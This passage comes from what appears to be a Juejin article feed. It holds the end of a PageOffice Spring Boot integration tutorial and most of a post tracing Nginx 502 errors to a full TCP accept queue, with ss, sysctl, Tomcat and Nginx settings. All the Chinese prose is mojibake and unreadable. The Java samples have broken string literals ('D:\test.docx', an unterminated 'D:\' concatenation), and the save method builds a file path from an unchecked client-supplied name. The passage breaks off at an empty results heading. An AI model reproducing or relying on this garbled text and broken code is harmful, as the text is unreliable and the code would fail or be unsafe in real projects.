<li>åœ¨Dç›˜æ ¹ç›®å½•ä¸‹å‡†å¤‡ä¸€ä¸ªæœ‰å†…å®¹çš„test.docxæ–‡ä»¶ï¼Œæ–°å»ºControllerå¹¶è°ƒç”¨PageOfficeåœ¨çº¿æ‰“å¼€æ­¤æ–‡ä»¶ï¼Œä¾‹å¦‚SimpleWordControllerä»£ç å¦‚ä¸‹ï¼š</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping</span>(value = <span class="hljs-string">"/simpleWord"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWordController</span> {  
    
  <span class="hljs-meta">@RequestMapping</span>(value=<span class="hljs-string">"/openFile"</span>)
  <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">openFile</span>(<span class="hljs-params">HttpServletRequest request</span>) {
      <span class="hljs-title class_">PageOfficeCtrl</span> poCtrl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageOfficeCtrl</span>(request);
      <span class="hljs-comment">//webOpençš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¯æŒèƒ½å¤Ÿè¾“å‡ºä¸‹è½½æ–‡ä»¶çš„Urlç›¸å¯¹åœ°å€æˆ–è€…æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ç£ç›˜è·¯å¾„ä¸¤ç§æ–¹å¼</span>
      <span class="hljs-comment">//æŸ¥çœ‹è¯¦ç»†ï¼Œè¯·åœ¨æœ¬ç«™æœç´¢â€œPageOfficeå±æ€§æˆ–æ–¹æ³•ä¸­æ¶‰åŠåˆ°çš„URLè·¯å¾„æˆ–ç£ç›˜è·¯å¾„çš„è¯´æ˜â€</span>
      poCtrl.<span class="hljs-title function_">webOpen</span>(<span class="hljs-string">"D:\test.docx"</span>, <span class="hljs-title class_">OpenModeType</span>.<span class="hljs-property">docNormalEdit</span>, <span class="hljs-string">"å¼ ä¸‰"</span>);
      request.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"poHtmlCode"</span>, poCtrl.<span class="hljs-title function_">getHtml</span>());
      <span class="hljs-keyword">return</span>  <span class="hljs-string">"simpleWord"</span>;
  }
    
  <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">"/saveFile"</span>)
  <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveFile</span>(<span class="hljs-params">HttpServletRequest request, HttpServletResponse response</span>) {
      <span class="hljs-title class_">FileSaver</span> fs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSaver</span>(request, response);
      fs.<span class="hljs-title function_">saveToFile</span>(<span class="hljs-string">"D:\" + fs.getFileName());
      fs.close();
  }
    
}
</span></code></pre>
<ol start="8">
<li>ä¸ºä¸Šä¸€æ­¥ä»£ç ä¸­çš„openFileæ–¹æ³•å‡†å¤‡Thymeleafæ¨¡æ¿ï¼šsimpleWord.htmlï¼Œä»£ç å¦‚ä¸‹ï¼š</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">"http://www.thymeleaf.org"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æœ€ç®€å•çš„æ‰“å¼€ä¿å­˜æ–‡ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:100%; height:800px;"</span>  <span class="hljs-attr">th:utext</span>=<span class="hljs-string">"${poHtmlCode}"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Save</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">//ä½¿ç”¨SaveFilePageå±æ€§è®¾ç½®åç«¯ä¿å­˜æ–¹æ³•çš„Controllerè·¯ç”±åœ°å€ï¼Œè¿™ä¸ªåœ°å€å¿…é¡»ä»"/"å¼€å§‹</span>
        pageofficectrl.<span class="hljs-property">SaveFilePage</span> = <span class="hljs-string">"/simpleWord/saveFile"</span>;
        pageofficectrl.<span class="hljs-title class_">WebSave</span>();
    }
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">OnPageOfficeCtrlInit</span>(<span class="hljs-params"/>) {
        pageofficectrl.<span class="hljs-title class_">AddCustomToolButton</span>(<span class="hljs-string">"ä¿å­˜"</span>, <span class="hljs-string">"Save"</span>, <span class="hljs-number">1</span>);
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<ol start="9">
<li>åœ¨éœ€è¦ç‚¹å‡»è¶…é“¾æ¥å®ç°åœ¨çº¿æ‰“å¼€æ–‡ä»¶çš„é¡µé¢ï¼ˆæ¯”å¦‚ï¼šindex.htmlï¼‰ä¸­æ·»åŠ pageoffice.jsæ–‡ä»¶çš„å¼•ç”¨ã€‚</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/pageoffice.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<ol start="10">
<li>ç„¶ååœ¨é¡µé¢ä¸­æ·»åŠ ä¸€ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»è¶…é“¾æ¥è°ƒç”¨POBrowserå¯¹è±¡çš„openWindowæ–¹æ³•ï¼Œå¼¹å‡ºæ–°æµè§ˆå™¨çª—å£è®¿é—®<code>simpleWord/openFile</code>åœ¨çº¿æ‰“å¼€æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</li>
</ol>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">a</span> href="javascript:POBrowser.<span class="hljs-built_in">openWindow</span>(<span class="hljs-string">'simpleWord/openFile'</span>,<span class="hljs-string">'width=1150px;height=900px;'</span>);"&gt;
    åœ¨çº¿æ‰“å¼€æ–‡æ¡£
&lt;/<span class="hljs-selector-tag">a</span>&gt;
</code></pre>
<ol start="11">
<li>å¯åŠ¨é¡¹ç›®ï¼Œç‚¹å‡»â€œåœ¨çº¿æ‰“å¼€æ–‡æ¡£â€è¶…é“¾æ¥ï¼ŒæŸ¥çœ‹åœ¨çº¿æ‰“å¼€ç¼–è¾‘ä¿å­˜Officeæ–‡ä»¶çš„æ•ˆæœã€‚</li>
</ol>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpageoffice.cn%2Fpages%2Ff8e4fe%2F" target="_blank" title="https://pageoffice.cn/pages/f8e4fe/" ref="nofollow noopener noreferrer">PageOfficeæœ€ç®€é›†æˆä»£ç (Springboot) | PageOffice å¼€å‘è€…ä¸­å¿ƒ</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[çº¿ä¸ŠNginxé¢‘ç¹502ï¼Œæ’æŸ¥3å°æ—¶å‘ç°æ˜¯è¿™ä¸ªé…ç½®çš„é—®é¢˜]]></title>    <link>https://juejin.cn/post/7592524811861688354</link>    <guid>https://juejin.cn/post/7592524811861688354</guid>    <pubDate>2026-01-08T05:56:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592524811861688354" data-draft-id="7592500570167902243" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="çº¿ä¸ŠNginxé¢‘ç¹502ï¼Œæ’æŸ¥3å°æ—¶å‘ç°æ˜¯è¿™ä¸ªé…ç½®çš„é—®é¢˜"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T05:56:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é©¬å¡å·´å¡"/> <meta itemprop="url" content="https://juejin.cn/user/1892677617451163"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            çº¿ä¸ŠNginxé¢‘ç¹502ï¼Œæ’æŸ¥3å°æ—¶å‘ç°æ˜¯è¿™ä¸ªé…ç½®çš„é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1892677617451163/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é©¬å¡å·´å¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:56:12.000Z" title="Thu Jan 08 2026 05:56:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›‘æ§å‘Šè­¦ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267561301%26content_type%3DArticle%26match_order%3D1%26q%3DNginx%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267561301&amp;content_type=Article&amp;match_order=1&amp;q=Nginx&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Nginx</a>Â 502é”™è¯¯ç‡é£™å‡åˆ°5%ã€‚</p>
<p>çœ‹äº†çœ¼åç«¯æœåŠ¡ï¼Œè¿è¡Œæ­£å¸¸ï¼Œæ²¡æœ‰æŠ¥é”™ã€‚é‡å¯Nginxï¼Œå¥½äº†ä¸€ä¼šåˆå¼€å§‹502ã€‚</p>
<p>æ’æŸ¥äº†3ä¸ªå°æ—¶ï¼Œæœ€åå‘ç°æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267561301%26content_type%3DArticle%26match_order%3D1%26q%3Dupstream%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267561301&amp;content_type=Article&amp;match_order=1&amp;q=upstream&amp;zhida_source=entity" ref="nofollow noopener noreferrer">upstream</a>é…ç½®çš„é—®é¢˜ã€‚è®°å½•ä¸€ä¸‹æ’æŸ¥è¿‡ç¨‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">é—®é¢˜ç°è±¡</h2>
<p><strong>ç›‘æ§æ•°æ®</strong>ï¼š</p>
<ul>
<li>502é”™è¯¯ç‡ï¼šä»0.1% â†’ 5%</li>
<li>åç«¯æœåŠ¡ï¼šæ­£å¸¸è¿è¡Œï¼Œæ— æŠ¥é”™</li>
<li>CPU/å†…å­˜ï¼šæ­£å¸¸</li>
<li>å‘ç”Ÿæ—¶é—´ï¼šæµé‡é«˜å³°æœŸ</li>
</ul>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>ä¸æ˜¯å…¨éƒ¨è¯·æ±‚éƒ½502ï¼Œå¤§éƒ¨åˆ†æ­£å¸¸</li>
<li>é‡å¯NginxåçŸ­æš‚æ¢å¤ï¼Œç„¶ååˆå‡ºç°</li>
<li>åç«¯æœåŠ¡æ—¥å¿—æ²¡æœ‰å¼‚å¸¸</li>
</ul>
<hr/>
<h2 data-id="heading-1">æ’æŸ¥è¿‡ç¨‹</h2>
<h3 data-id="heading-2">Step 1ï¼šçœ‹Nginxé”™è¯¯æ—¥å¿—</h3>
<pre><code class="hljs language-lua" lang="lua">tail -f /var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>
</code></pre>
<p>å‘ç°å¤§é‡è¿™æ ·çš„é”™è¯¯ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">upstream timed <span class="hljs-keyword">out</span> (<span class="hljs-number">110</span>: Connection timed <span class="hljs-keyword">out</span>) <span class="hljs-keyword">while</span> connecting to upstream
upstream prematurely closed connection <span class="hljs-keyword">while</span> reading response header
</code></pre>
<p><strong>å…³é”®ä¿¡æ¯</strong>ï¼šæ˜¯upstreamè¿æ¥çš„é—®é¢˜ï¼Œä¸æ˜¯åç«¯æœåŠ¡æœ¬èº«çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-3">Step 2ï¼šæ£€æŸ¥åç«¯æœåŠ¡çŠ¶æ€</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># æŸ¥çœ‹åç«¯æœåŠ¡è¿›ç¨‹</span>
ps aux | <span class="hljs-keyword">grep</span> java

<span class="hljs-comment"># æŸ¥çœ‹ç«¯å£ç›‘å¬</span>
ss -tlnp | <span class="hljs-keyword">grep</span> <span class="hljs-number">8080</span>

<span class="hljs-comment"># ç›´æ¥æµ‹è¯•åç«¯</span>
curl -I http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8080</span>/health
</code></pre>
<p>åç«¯æœåŠ¡æ­£å¸¸ï¼Œç›´æ¥è®¿é—®è¿”å›200ã€‚</p>
<h3 data-id="heading-4">Step 3ï¼šæ£€æŸ¥è¿æ¥æ•°</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹Nginxåˆ°åç«¯çš„è¿æ¥æ•°</span>
ss -ant | grep 8080 | <span class="hljs-built_in">wc</span> -l

<span class="hljs-comment"># æŸ¥çœ‹è¿æ¥çŠ¶æ€åˆ†å¸ƒ</span>
ss -ant | grep 8080 | awk <span class="hljs-string">'{print $1}'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c
</code></pre>
<p>å‘ç°é—®é¢˜äº†ï¼š</p>
<pre><code class="hljs">850 ESTABLISHED
   120 TIME_WAIT
    50 SYN_SENT
</code></pre>
<p>æœ‰50ä¸ªè¿æ¥å¡åœ¨<code>SYN_SENT</code>çŠ¶æ€ï¼Œè¯´æ˜Nginxåˆ°åç«¯çš„æ–°è¿æ¥å»ºç«‹ä¸ä¸Šã€‚</p>
<h3 data-id="heading-5">Step 4ï¼šæ£€æŸ¥åç«¯è¿æ¥é˜Ÿåˆ—</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># æŸ¥çœ‹åç«¯æœåŠ¡çš„accepté˜Ÿåˆ—</span>
ss -lnt | <span class="hljs-keyword">grep</span> <span class="hljs-number">8080</span>
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs language-css" lang="css">State    Recv-<span class="hljs-selector-tag">Q</span>   Send-<span class="hljs-selector-tag">Q</span>   Local <span class="hljs-selector-tag">Address</span>:Port
LISTEN   <span class="hljs-number">129</span>      <span class="hljs-number">128</span>      <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>
</code></pre>
<p><strong>é—®é¢˜æ‰¾åˆ°äº†ï¼</strong> Â <code>Recv-Q</code>æ˜¯129ï¼Œ<code>Send-Q</code>æ˜¯128ã€‚</p>
<p>è¿™è¯´æ˜accepté˜Ÿåˆ—æ»¡äº†ï¼ˆ128æ˜¯é»˜è®¤å€¼ï¼‰ï¼Œæ–°è¿æ¥æ— æ³•è¢«æ¥å—ã€‚</p>
<hr/>
<h2 data-id="heading-6">æ ¹å› åˆ†æ</h2>
<h3 data-id="heading-7">ä»€ä¹ˆæ˜¯accepté˜Ÿåˆ—</h3>
<pre><code class="hljs language-perl" lang="perl">å®¢æˆ·ç«¯ â†’ SYN â†’ æœåŠ¡ç«¯ï¼ˆåŠè¿æ¥é˜Ÿåˆ—ï¼‰
æœåŠ¡ç«¯ â†’ SYN+ACK â†’ å®¢æˆ·ç«¯
å®¢æˆ·ç«¯ â†’ ACK â†’ æœåŠ¡ç«¯ï¼ˆå…¨è¿æ¥é˜Ÿåˆ—/<span class="hljs-keyword">accept</span>é˜Ÿåˆ—ï¼‰
åº”ç”¨ç¨‹åº <span class="hljs-keyword">accept</span>() â†’ å–å‡ºè¿æ¥
</code></pre>
<p>å½“accepté˜Ÿåˆ—æ»¡äº†ï¼Œæ–°çš„å®Œæˆä¸‰æ¬¡æ¡æ‰‹çš„è¿æ¥æ— æ³•è¿›å…¥é˜Ÿåˆ—ï¼Œå®¢æˆ·ç«¯ä¼šæ”¶åˆ°è¶…æ—¶æˆ–RSTã€‚</p>
<h3 data-id="heading-8">ä¸ºä»€ä¹ˆé˜Ÿåˆ—æ»¡äº†</h3>
<p>åç«¯æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267561301%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BBoot%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267561301&amp;content_type=Article&amp;match_order=1&amp;q=Spring+Boot&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring Boot</a>åº”ç”¨ï¼Œé»˜è®¤é…ç½®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">tomcat:</span>
    <span class="hljs-attr">accept-count:</span> <span class="hljs-number">100</span>  <span class="hljs-comment"># Tomcatçš„accepté˜Ÿåˆ—</span>
</code></pre>
<p>è€Œç³»ç»Ÿå±‚é¢çš„é™åˆ¶æ˜¯<code>net.core.somaxconn = 128</code>ï¼Œå–ä¸¤è€…è¾ƒå°å€¼ï¼Œæ‰€ä»¥å®é™…accepté˜Ÿåˆ—åªæœ‰128ã€‚</p>
<p><strong>æµé‡é«˜å³°æ—¶</strong>ï¼š</p>
<ol>
<li>è¯·æ±‚é‡å¤§ï¼Œæ–°è¿æ¥å¤š</li>
<li>accepté˜Ÿåˆ—128ä¸å¤Ÿç”¨</li>
<li>æ–°è¿æ¥è¢«æ‹’ç»</li>
<li>Nginxæ”¶åˆ°è¶…æ—¶ï¼Œè¿”å›502</li>
</ol>
<hr/>
<h2 data-id="heading-9">è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-10">æ–¹æ¡ˆä¸€ï¼šè°ƒå¤§ç³»ç»Ÿå‚æ•°</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰å€¼</span>
sysctl net.core.somaxconn

<span class="hljs-comment"># ä¸´æ—¶ä¿®æ”¹</span>
sysctl -w net.core.somaxconn=65535

<span class="hljs-comment"># æ°¸ä¹…ä¿®æ”¹</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"net.core.somaxconn = 65535"</span> &gt;&gt; /etc/sysctl.conf
sysctl -p
</code></pre>
<h3 data-id="heading-11">æ–¹æ¡ˆäºŒï¼šè°ƒæ•´Tomcaté…ç½®</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">tomcat:</span>
    <span class="hljs-attr">accept-count:</span> <span class="hljs-number">1000</span>      <span class="hljs-comment"># accepté˜Ÿåˆ—å¤§å°</span>
    <span class="hljs-attr">max-connections:</span> <span class="hljs-number">10000</span>  <span class="hljs-comment"># æœ€å¤§è¿æ¥æ•°</span>
    <span class="hljs-attr">threads:</span>
      <span class="hljs-attr">max:</span> <span class="hljs-number">500</span>              <span class="hljs-comment"># æœ€å¤§å·¥ä½œçº¿ç¨‹æ•°</span>
</code></pre>
<h3 data-id="heading-12">æ–¹æ¡ˆä¸‰ï¼šNginx upstreamä¼˜åŒ–</h3>
<pre><code class="hljs language-ini" lang="ini">upstream backend {
    server 127.0.0.1:8080 <span class="hljs-attr">max_fails</span>=<span class="hljs-number">3</span> fail_timeout=<span class="hljs-number">30</span>s<span class="hljs-comment">;</span>
    
    keepalive 100<span class="hljs-comment">;  # ä¿æŒè¿æ¥æ•°ï¼Œå‡å°‘æ–°å»ºè¿æ¥</span>
}

server {
    location / {
        proxy_pass http://backend<span class="hljs-comment">;</span>
        
        proxy_connect_timeout 5s<span class="hljs-comment">;      # è¿æ¥è¶…æ—¶</span>
        proxy_read_timeout 60s<span class="hljs-comment">;        # è¯»å–è¶…æ—¶</span>
        proxy_send_timeout 60s<span class="hljs-comment">;        # å‘é€è¶…æ—¶</span>
        
        proxy_http_version 1.1<span class="hljs-comment">;        # ä½¿ç”¨HTTP/1.1</span>
        proxy_set_header Connection ""<span class="hljs-comment">; # é…åˆkeepalive</span>
    }
}
</code></pre>
<h3 data-id="heading-13">æ–¹æ¡ˆå››ï¼šå¤šå®ä¾‹è´Ÿè½½å‡è¡¡</h3>
<p>å¦‚æœå•å®ä¾‹æ’‘ä¸ä½ï¼Œå¯ä»¥éƒ¨ç½²å¤šå®ä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">upstream backend {
    least_conn<span class="hljs-comment">;  # æœ€å°‘è¿æ¥æ•°ç­–ç•¥</span>
    
    server 127.0.0.1:8080 <span class="hljs-attr">weight</span>=<span class="hljs-number">1</span><span class="hljs-comment">;</span>
    server 127.0.0.1:8081 <span class="hljs-attr">weight</span>=<span class="hljs-number">1</span><span class="hljs-comment">;</span>
    server 127.0.0.1:8082 <span class="hljs-attr">weight</span>=<span class="hljs-number">1</span><span class="hljs-comment">;</span>
    
    keepalive 100<span class="hljs-comment">;</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-14">æœ€ç»ˆé…ç½®</h2>
<p><strong>ç³»ç»Ÿå‚æ•°</strong>ï¼ˆ/etc/sysctl.confï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">net.core.somaxconn</span> = <span class="hljs-number">65535</span>
<span class="hljs-attr">net.ipv4.tcp_max_syn_backlog</span> = <span class="hljs-number">65535</span>
<span class="hljs-attr">net.core.netdev_max_backlog</span> = <span class="hljs-number">65535</span>
</code></pre>
<p><strong>Spring Booté…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">tomcat:</span>
    <span class="hljs-attr">accept-count:</span> <span class="hljs-number">2000</span>
    <span class="hljs-attr">max-connections:</span> <span class="hljs-number">20000</span>
    <span class="hljs-attr">threads:</span>
      <span class="hljs-attr">max:</span> <span class="hljs-number">500</span>
      <span class="hljs-attr">min-spare:</span> <span class="hljs-number">50</span>
</code></pre>
<p><strong>Nginxé…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">upstream backend {
    server 127.0.0.1:8080<span class="hljs-comment">;</span>
    keepalive 200<span class="hljs-comment">;</span>
}

server {
    location / {
        proxy_pass http://backend<span class="hljs-comment">;</span>
        proxy_http_version 1.1<span class="hljs-comment">;</span>
        proxy_set_header Connection ""<span class="hljs-comment">;</span>
        proxy_connect_timeout 5s<span class="hljs-comment">;</span>
        proxy_read_timeout 60s<span class="hljs-comment">;</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-15">ä¼˜åŒ–æ•ˆæœ</h2>

























